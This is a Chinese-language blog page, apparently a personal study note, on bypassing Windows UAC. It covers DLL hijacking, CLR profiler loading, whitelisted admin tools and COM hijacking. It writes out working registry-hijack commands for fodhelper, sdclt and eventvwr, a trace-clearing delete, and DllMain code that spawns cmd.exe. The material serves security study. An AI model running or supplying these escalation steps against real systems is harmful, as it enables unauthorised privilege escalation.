+<p>一般用工具sigcheck检测</p>
+<p>网上常拿C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe 举列子</p>
+<p><img alt="image-20210301000136728" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210301000136728.png" title="image-20210301000136728" /></p>
+<p><img alt="image-20210301000141880" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210301000141880.png" title="image-20210301000141880" /></p>
+<p>这个东西很有用，是下面部分方法的前提条件</p>
+<h3 id="requestedexecutionlevel">requestedExecutionLevel</h3>
+<p><img alt="image-20210302125607741" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210302125607741.png" title="image-20210302125607741" /></p>
+<p>有三个不同的参数：asInvoker requireAdministrator highestAvailable 分别对应应用程序以什么权限运行</p>
+<p>asInvoker：父进程是什么权限，此应用程序就是什么权限</p>
+<p>requireAdministrator：需要以管理员权限来运行，此类应用程序图标右下方会有个盾牌标记</p>
+<p><img alt="image-20210302125851318" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210302125851318.png" title="image-20210302125851318" /></p>
+<p>highestAvailable：此程序以当前用户能获取到的最高权限运行。当你在管理员账户下运行此程序就会要求权限提升以及弹出UAC框。当你在标准账户下运行此程序，由于此账户的最高权限就是标准账户，所以双击便运行</p>
+<h2 id="_1">白名单程序</h2>
+<p>除了刚刚说的autoelevate，还有一类叫白名单程序的应用程序也是打开默认提权的。如服务管理工具下的许多应用都属于白名单程序，而其中又有些程序执行时需要依赖CLR支持（如事件查看器，任务计划程序）</p>
+<h2 id="dll">DLL劫持</h2>
+<p>reference:<a href="https://www.anquanke.com/post/id/209033" title="https://www.anquanke.com/post/id/209033">https://www.anquanke.com/post/id/209033</a>
+<a href="https://www.cnblogs.com/0daybug/p/11719541.html" title="https://www.cnblogs.com/0daybug/p/11719541.html">https://www.cnblogs.com/0daybug/p/11719541.html</a></p>
+<p>exe文件运行时会加载许多dll文件，这些dll文件的加载顺序是</p>
+<ul>
+<li>程序所在目录</li>
+<li>系统目录即<code>SYSTEM32</code>目录</li>
+<li>16位系统目录即<code>SYSTEM</code>目录</li>
+<li><code>Windows</code>目录</li>
+<li>程序加载目录(<code>SetCurrentDirecctory</code>)</li>
+<li>
+<p><code>PATH</code>环境变量中列出的目录
+    同时，dll加载也遵循着<code>Know DLLs注册表项</code>的机制：Know DLLs注册表项指定的DLL是已经被操作系统加载过后的DLL，不会被应用程序搜索并加载。在注册表HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLS处可以看见这些dll</p>
+<p><img alt="image-20210301184035776" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210301184035776.png" title="image-20210301184035776" /></p>
+</li>
+</ul>
+<p>在knowdlls表项中的dll是预先就加载进内存空间的，被诸多应用调用着，改动需要高权限。</p>
+<p>如果我们在应用程序找到正确的dll之前，将我们自己创造的dll放入优先级更高的搜索目录让应用程序优先加载此dll文件，这就造成了dll劫持。但这只是dll劫持的其中一种途径，他有这些途径：</p>
+<p>（1） DLL替换：用恶意的DLL替换掉合法的DLL
+（2） DLL搜索顺序劫持：当应用程序加载DLL的时候，如果没有带指定DLL的路径，那么程序将会以特定的顺序依次在指定的路径下搜索待加载的DLL。通过将恶意DLL放在真实DLL之前的搜索位置，就可以劫持搜索顺序，劫持的目录有时候包括目标应用程序的工作目录。
+（3） 虚拟DLL劫持：释放一个恶意的DLL来代替合法应用程序加载的丢失/不存在的DLL
+（4） DLL重定向：更改DLL搜索的路径，比如通过编辑%PATH%环境变量或 .exe.manifest/.exe.local文件以将搜索路径定位到包含恶意DLL的地方。
+（5） WinSxS DLL替换：将目标DLL相关的WinSxS文件夹中的恶意DLL替换为合法的DLL。此方法通常也被称为DLL侧加载
+（6） 相对路径DLL劫持：将合法的应用程序复制（并有选择地重命名）与恶意的DLL一起放入到用户可写的文件夹中。在使用方法上，它与（签名的）二进制代理执行有相似之处。它的一个变体是（有点矛盾地称为）“自带LOLbin”，其中合法的应用程序带有恶意的DLL（而不是从受害者机器上的合法位置复制）。</p>
+<h4 id="1">实践出真知1</h4>
+<p>这里我们先用第一种方法来进行实验，实验对象是C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe和Listary。Listary是一个很好用的检索小工具，我通过processmonitor，设置好过滤条件，查看SystemPropertiesAdvanced.exe调用的dll时发现它会调用一个Listary下的一个名为ListaryHook.dll的dll。</p>
+<p><img alt="image-20210302132631680" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210302132631680.png" title="image-20210302132631680" /></p>
+<p>由于listary目录权限不高，我们可以直接替换该dll，换成dllmain为打开cmd的dll。然后点击运行SystemPropertiesAdvanced.exe，就会发现会弹出高权限cmd窗口</p>
+<p><img alt="image-20210302132724843" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210302132724843.png" title="image-20210302132724843" /></p>
+<p>bypassuac成功。 当然这种都不能算是一个洞，listary并不是人人电脑上都有的，而且这个软件装机量应该是极少数少的，所以这里只是提供一个思路，这种洞该怎么去找。</p>
+<h4 id="2">实践出真知2</h4>
+<p>这里使用第三种方法进行实验，实验对象是eventvwr.msc，它是管理工具中的事件查看器，它依赖于mmc.exe来运行。比如，你想运行它，就得通过mmc eventvwr.msc来运行它,并且在process exploer中只能看到个mmc.exe。</p>
+<p>我们process monitor设置过滤如下</p>
+<p><img alt="image-20210302205938167" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210302205938167.png" title="image-20210302205938167" /></p>
+<p>cmd运行 mmc eventvwr.msc,查看调用</p>
+<p><img alt="image-20210302210053342" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210302210053342.png" title="image-20210302210053342" /></p>
+<p>dll搜索顺序确实是 程序目录-&gt;SYSTEM32-&gt;SYSTEM-&gt;WINDOWS-&gt;当前目录（这里也是SYSTEM32目录，我认为的原因是mmc会自动提升权限导致当前目录为System32导致的）-&gt;PATH目录。</p>
+<p>我们只需在可写目录下植入名为elsext.dll的恶意dll，处理好dll的dllmain函数，就能让dllmain里的指令被高权限执行</p>
+<p>但是无奈我这里环境是win7 sp1,但是这个洞7600才出现，所以复现不了了。但大概思路就是这样的</p>
+<h2 id="clrdll">CLR加载任意DLL</h2>
+<p>CLR是微软为.net运行时提供的环境，像java的虚拟机一样，而clr有一个Profiling机制。这个机制简而言之便是可以给CLR提供一个dll，当任何高权限.NET运行时都会主动加载该DLL，我们可以构造恶意dll给CLR加载，从而获得高权限的进程如cmd，从而bypassuac。</p>
+<p>至于这个dll如何给CLR，是通过修改以下环境变量实现的</p>
+<pre><code class="language-纯文本">COR_ENABLE_PROFILING = 1
+
+COR_PROFILER={CLSIDor ProgID}
+</code></pre>
+<p>CLR会检查环境变量中的COR_ENABLE_PROFILING，若为1则检查通过，进行下一步。
+在net4.0以前，若检查通过，会马上去查找COR_PROFILER指定的注册表项，找到其dll路径并加载
+net4.0后，会先查找COR_PROFILER_PATH是否指定dll文件路径，若没有再去查找COR_PROFILER指定的注册表项，找到其dll路径并加载。
+总而言之，我们设置好COR_ENABLE_PROFILING和COR_PROFILER两个项就可以了。</p>
+<p>接下来我们设置用户环境变量，设置用户环境变量时不需要高权限（win10似乎设置系统环境变量也不需要）。
+以及在注册表，在指定的CLSID属性下新建Inprocserver32项，并写入恶意dll路径. 然后通过mmc调用一下gpedit.msc这种程序，即可以高权限执行dll。如果dll执行命令为system("cmd.exe")  那么就会蹦出来高权限cmd窗口</p>
+<pre><code class="language-纯文本">REG ADD &quot;HKCU\Software\Classes\CLSID\{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}\InprocServer32&quot; /ve /t REG_EXPAND_SZ /d &quot;C:\test\calc.dll&quot; /f
+REG ADD &quot;HKCU\Environment&quot; /v &quot;COR_PROFILER&quot; /t REG_SZ /d &quot;{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}&quot; /f
+REG ADD &quot;HKCU\Environment&quot; /v &quot;COR_ENABLE_PROFILING&quot; /t REG_SZ /d &quot;1&quot; /f
+mmc gpedit.msc
+</code></pre>
+<p>但我死活复现不起不知道为啥，我的dll这样写的</p>
+<pre><code class="language-纯文本">// dllmain.cpp : 定义 DLL 应用程序的入口点。
+#include &quot;pch.h&quot;
+#include &lt;iostream&gt;
+#include &lt;Windows.h&gt;
+
+BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
+{
+    char cmd[] = &quot;cmd.exe&quot;;
+
+    switch (fdwReason)
+    {
+    case DLL_PROCESS_ATTACH:
+        WinExec(cmd, SW_SHOWNORMAL);
+        ExitProcess(0);
+        break;
+    case DLL_THREAD_ATTACH:
+        break;
+    case DLL_THREAD_DETACH:
+        break;
+    case DLL_PROCESS_DETACH:
+        break;
+    }
+    return TRUE;
+}
+</code></pre>
+<p>另外的，你还可以为COR_PROFILER_PATH设置为如\\server\share\test.dll的smb的路径，这样也可以实现bypassuac（没复现）</p>
+<h2 id="_2">白名单程序</h2>
+<h3 id="odbcad32exe">odbcad32.exe</h3>
+<p>这个方法很简单。打开C:\Windows\system32\odbcad32.exe，然后通过以下方法打开powershell或者cmd</p>
+<p><img alt="image-20210302133941728" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210302133941728.png" title="image-20210302133941728" /></p>
+<p>成功bypass</p>
+<p><img alt="image-20210302134014137" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210302134014137.png" title="image-20210302134014137" /></p>
+<h3 id="_3">管理工具</h3>
+<p>之前说过，管理工具有很多白名单程序，如果一个白名单程序有浏览文件目录的功能，就可以以此来创建高权限cmd窗口。这里拿事件查看器举例</p>
+<p>操作-》打开保存的目录-》文件目录路径处输入powershell-》弹出高权限powershell    以此内推，还有很多相似的管理工具可以这样利用</p>
+<h2 id="_4">注册表劫持</h2>
+<h3 id="fodhelperexe">Fodhelper.exe</h3>
+<p>Fodhelper.exe win10才有，所以只有win10能通过这个办法bypassuac，他是一个autoelevate元素程序</p>
+<p>我们使用proceemonitor查看事件查看器启动的时候执行了什么。我们通过排查发现了此处</p>
+<p><img alt="image-20210302194843185" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210302194843185.png" title="image-20210302194843185" /></p>
+<p>发现程序试图打开HKCU\Software\Classes\ms-settings\shell\open\command，但是这个项没有找到，因为这个项并不存在，于是它查询 HKCR\ms-settings\Shell\Open,查询成功便打开其下的Command键进行查询。
+我们可以劫持注册表，往HKCU\Software\Classes\ms-settings\shell\open\command写入恶意指令从而达到bypassuac的目的。</p>
+<pre><code class="language-纯文本">reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command /d C:\Windows\System32\cmd.exe /f 
+reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_DWORD /d 00000000 /f
+</code></pre>
+<p>我们写入如下命令，就能让Fodhelper.exe 执行时自动高权限执行cmd窗口了</p>
+<p>然后消除痕迹</p>
+<pre><code class="language-纯文本">reg delete &quot;HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command&quot;
+</code></pre>
+<h3 id="sdclt">sdclt</h3>
+<p>Win10后这个程序才有自动提升权限的能力</p>
+<pre><code class="language-纯文本">reg add &quot;HKCU\Software\Classes\Folder\shell\open\command&quot; /d C:\Windows\System32\cmd.exe /f 
+reg add &quot;HKCU\Software\Classes\Folder\shell\open\command&quot; /v &quot;DelegateExecute&quot; /f
+
+</code></pre>
+<p><img alt="image-20210302201240945" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210302201240945.png" title="image-20210302201240945" /></p>
+<h3 id="eventvmr">eventvmr</h3>
+<pre><code class="language-纯文本">reg add &quot;HKCU\Software\Classes\mscfile\shell\open\command&quot; /d C:\Windows\System32\cmd.exe /f
+</code></pre>
+<p>win10，win7均无效,不知道是哪个版本的事了，反正记录下来吧。</p>
+<h2 id="com">COM劫持</h2>
+<p>和dll劫持类似，应用程序在运行时也会去加载指定CLSID的COM组件，其加载顺序如下</p>
+<pre><code class="language-纯文本">HKCU\Software\Classes\CLSID
+HKCR\CLSID
+HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellCompatibility\Objects\
+</code></pre>
+<p>以eventvwr为例</p>
+<p>执行该程序时会去寻找{0A29FF9E-7F9C-4437-8B11-F424491E3931}这个组件，这个组件又需要加载InProcServer32指定的DLL，而这个DLL的路径可由用户定义。</p>
+<p>而eventvwr的这个组件一般在HKCR\CLSID找到，所以可以搜索路径劫持。</p>
+<p>利用以下方法可以劫持（搜索路径劫持）</p>
+<pre><code class="language-纯文本">reg add HKEY_CURRENT_USER\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\InProcServer32 /v &quot;&quot; /t REG_SZ /d &quot;d:\msf_x64.dll&quot; /f 
+
+reg add HKEY_CURRENT_USER\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\InProcServer32 /v &quot;LoadWithoutCOM&quot; /t REG_SZ /d &quot;&quot; /f 
+
+reg add HKEY_CURRENT_USER\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\InProcServer32 /v &quot;ThreadingModel&quot; /t REG_SZ /d &quot;Apartment&quot; /f 
+
+reg add HKEY_CURRENT_USER\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\ShellFolder /v &quot;HideOnDesktop&quot; /t REG_SZ /d &quot;&quot; /f 
+
+reg add HKEY_CURRENT_USER\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\ShellFolder /v &quot;Attributes&quot; /t REG_DWORD /d 0xf090013d /f
+</code></pre>
+<h2 id="com_1">利用com接口</h2>
+<h3 id="icmluautil">ICMLuaUtil</h3>
+<p><img alt="image-20210304122737764" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210304122737764.png" title="image-20210304122737764" /></p>
+<h2 id="uacme">UACME</h2>
+<p>一个开源项目，记录了许多Bypassuac的方法。</p>
+<p><a href="https://github.com/hfiref0x/UACME/tree/v3.2.x" title="https://github.com/hfiref0x/UACME/tree/v3.2.x">https://github.com/hfiref0x/UACME/tree/v3.2.x</a></p>
+<h1 id="windbg">windbg调试</h1>
+<p>大家自己找资料玩，因为我也不会</p>
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    <script id="__config" type="application/json">{"base": "..", "features": [], "search": "../assets/javascripts/workers/search.208ed371.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    
+    
+      <script src="../assets/javascripts/bundle.efa0ade1.min.js"></script>
+      
+    
+  </body>
+</html>
